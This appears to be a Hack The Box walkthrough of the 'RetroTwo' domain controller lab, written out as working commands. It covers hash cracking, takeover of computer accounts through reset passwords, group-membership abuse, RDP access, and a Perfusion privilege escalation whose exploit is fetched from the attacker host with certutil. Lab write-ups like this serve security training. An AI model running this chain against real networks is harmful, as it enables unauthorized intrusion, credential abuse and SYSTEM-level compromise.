# RetroTwo — Hack The Box

Windows Server 2008 R2 domain controller. The path in this session was Guest SMB access → a password-protected Access database → LDAP credentials → BloodHound object rights → a pre-created computer account → control of another computer account → `SERVICES` group membership → RDP as `ldapreader`. The official walkthrough finishes with the `RpcEptMapper` registry weakness and a SYSTEM shell.

The target address changes when the HTB instance is restarted. Commands below omit flag values and plaintext passwords. Enter the passwords found or chosen during the lab when prompted. The RDP foothold and registry permissions were verified in this session; the final SYSTEM shell and flag reads were not shown in our terminal output.

## Reconnaissance

As root on Kali, set the current lab address:

```bash
export TARGET='YOUR_CURRENT_HTB_IP'
echo "$TARGET retro2.vl BLN01.retro2.vl" >> /etc/hosts
nmap -sC -sV retro2.vl -oN retro2.nmap
```

DNS (53), Kerberos (88), LDAP (389/3268), SMB (445), and RDP (3389) indicated a domain controller. Nmap identified `BLN01.retro2.vl` in the `retro2.vl` domain, running Windows Server 2008 R2 SP1. SMB signing was required. The SMB script used Guest, which made the shares the first place to look.

## Guest SMB and the Access database

```bash
nxc smb retro2.vl -u 'guest' -p '' --shares
smbclient //retro2.vl/Public -U 'guest%' -c 'ls; cd DB; ls; get staff.accdb'
file staff.accdb
```

Guest could read `Public`. Its `DB` directory contained `staff.accdb`, an encrypted Microsoft Access database. Opening it in a text editor does not expose its tables or VBA code. `office2john` extracted an Office 2013-style hash, which Hashcat handles with mode 9600:

```bash
python3 /usr/share/john/office2john.py staff.accdb > staff.john
cut -d: -f2- staff.john > staff.hash
hashcat -m 9600 staff.hash /usr/share/wordlists/rockyou.txt
hashcat -m 9600 --show staff.hash
```

The database password cracked. In this session I did not open the file with Microsoft Access; I used the supplied official walkthrough for the next detail: VBA in the database contains the `ldapreader` domain credential. That distinction matters because cracking the file password alone did not extract the LDAP password on Kali.

## LDAP and BloodHound

The LDAP credential authenticated and allowed domain user enumeration. The empty-password Guest session did not allow the same LDAP search:

```bash
read -rsp 'Password for ldapreader: ' LDAP_PASS; echo
nxc ldap BLN01.retro2.vl -u ldapreader -p "$LDAP_PASS" --users
bloodhound-ce-python -u ldapreader -p "$LDAP_PASS" -d retro2.vl \
  --zip -c All -dc BLN01.retro2.vl -ns "$TARGET"
```

The BloodHound collection showed a short path through computer accounts:

- `FS01$` belongs to `Domain Computers`. That group had `ForceChangePassword` and `GenericWrite` over `ADMWS01$` (and `FS02$`).
- `ADMWS01$` had `AddMember` on the `SERVICES` group.
- `SERVICES` belonged to `Remote Desktop Users`.

The useful outcome was to add our human account, `ldapreader`, to `SERVICES`, then use RDP. First we needed working credentials for `FS01$`.

## Pre-created computer account

`FS01$` had the pre-Windows 2000 computer-account behavior: its initial password followed the lowercase computer name without the trailing `$`. The first SMB check returned `STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT`, which was a clue that the account existed with that initial password, but was not yet usable for normal SMB logon.

```bash
read -rsp 'Initial password for FS01$: ' FS_DEFAULT; echo
nxc smb "$TARGET" -u 'FS01$' -p "$FS_DEFAULT"

read -rsp 'New password for FS01$: ' FS_PASS; echo
impacket-changepasswd -protocol rpc-samr -newpass "$FS_PASS" \
  "retro2.vl/FS01\$:$FS_DEFAULT@$TARGET"
nxc smb "$TARGET" -u 'FS01$' -p "$FS_PASS"
```

After the self-service password change, `FS01$` authenticated. Its effective domain rights could now be used against `ADMWS01$`.

## From computer control to RDP

Use the `FS01$` credential to change `ADMWS01$`'s password, then authenticate as that computer account and add `ldapreader` to `SERVICES`:

```bash
read -rsp 'New password for ADMWS01$: ' ADM_PASS; echo
net rpc password 'ADMWS01$' "$ADM_PASS" \
  -U "retro2.vl/FS01\$%$FS_PASS" -S BLN01.retro2.vl
nxc smb "$TARGET" -u 'ADMWS01$' -p "$ADM_PASS"

bloodyAD --host "$TARGET" -d retro2.vl -u 'ADMWS01$' -p "$ADM_PASS" \
  add groupMember 'SERVICES' 'ldapreader'
ldapsearch -x -H "ldap://$TARGET" -D 'ldapreader@retro2.vl' -w "$LDAP_PASS" \
  -b 'DC=retro2,DC=vl' '(sAMAccountName=SERVICES)' member
```

`bloodyAD` reported the addition, and LDAP returned `CN=ldapreader` as a member of `SERVICES`. With that group membership, `ldapreader` could log on to the domain controller over RDP. My installed FreeRDP 3 expected `/tls:seclevel:0`; the older `/tls-seclevel:0` spelling failed during argument parsing:

```bash
xfreerdp3 /u:ldapreader /p:"$LDAP_PASS" /v:"$TARGET" \
  /d:retro2.vl /tls:seclevel:0 /cert:ignore
```

## Local enumeration and privilege escalation

In the RDP PowerShell session, `whoami /all` confirmed `retro2\ldapreader` and membership in `RETRO2\services` and `BUILTIN\Remote Desktop Users`. The token did not have `SeImpersonatePrivilege` or `SeBackupPrivilege`. I checked the service registry key instead:

```powershell
whoami /all
Get-ChildItem C:\ -Filter user.txt
(Get-Acl 'HKLM:\SYSTEM\CurrentControlSet\Services\RpcEptMapper').Access |
  Format-Table IdentityReference,RegistryRights,AccessControlType -AutoSize
```

`Authenticated Users` had `CreateSubKey` on `RpcEptMapper`. On this older Windows version, [Perfusion](https://github.com/itm4n/Perfusion) uses the service's performance-counter registry behavior to obtain a privileged execution context. The official walkthrough uses this route. The following steps describe that documented finish; I did not capture a successful SYSTEM prompt in this session.

Put a trusted build of `Perfusion.exe` in a directory on Kali. Check the current `tun0` address after reconnecting the VPN, then serve that directory:

```bash
ip -4 -br addr show tun0
LHOST=$(ip -4 -o addr show tun0 | awk '{split($4,a,"/"); print a[1]}')
python3 -m http.server 8000 --bind "$LHOST"
```

From the target's RDP PowerShell session, download it using `certutil` and run it interactively:

```powershell
cd $env:TEMP
certutil.exe -urlcache -f http://YOUR_TUN0_IP:8000/Perfusion.exe Perfusion.exe
.\Perfusion.exe -c cmd -i
```

The expected result is a new command prompt running as `NT AUTHORITY\SYSTEM`. Confirm the identity before reading the flag:

```cmd
whoami
type C:\Users\Administrator\Desktop\root.txt
```
